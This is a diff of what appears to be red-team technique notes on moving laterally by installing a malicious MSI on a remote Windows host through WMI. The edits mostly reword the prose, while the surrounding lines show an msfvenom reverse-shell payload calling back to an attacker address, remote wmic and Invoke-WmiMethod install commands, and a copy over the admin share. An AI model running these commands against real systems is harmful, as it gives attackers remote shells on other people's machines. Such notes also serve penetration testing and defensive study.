@@ -14,7 +14,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f msi > evil
 
 ![](../.gitbook/assets/screenshot-from-2018-10-19-17-31-00.png)
 
-I tried executing the .msi payload like so, but got a return code `1619` and quick search on google showed me nothing usefull:
+I tried executing the .msi payload like so, but got a return code `1619` and quick search on google showed  nothing usefull:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@remote" %}
@@ -26,7 +26,7 @@ wmic /node:10.0.0.7 /user:offense\administrator product call install PackageLoca
 
 ![](../.gitbook/assets/screenshot-from-2018-10-19-18-45-55.png)
 
-Not a clean way of achieving the goal, but worked anyways:
+So I had to revert to a filthy way of achieving the goal:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@remote" %}
@@ -38,7 +38,7 @@ net use \\10.0.0.7\c$ /user:administrator@offense; copy C:\experiments\evil64.ms
 
 ![](../.gitbook/assets/peek-2018-10-19-18-41.gif)
 
-Additionally, the same could of course be achieved using powershell:
+Additionally, the same could of course be achieved using powershell cmdlets:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@remote" %}
@@ -48,11 +48,15 @@ Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
+Get a prompt for credentials:
+
 ![](../.gitbook/assets/screenshot-from-2018-10-19-19-02-10.png)
+
+and enjoy the code execution:
 
 ![](../.gitbook/assets/screenshot-from-2018-10-19-19-02-48.png)
 
-Or if no GUI for credentials, a oneliner:
+Or if no GUI is available for credentials, a oneliner:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@remote" %}
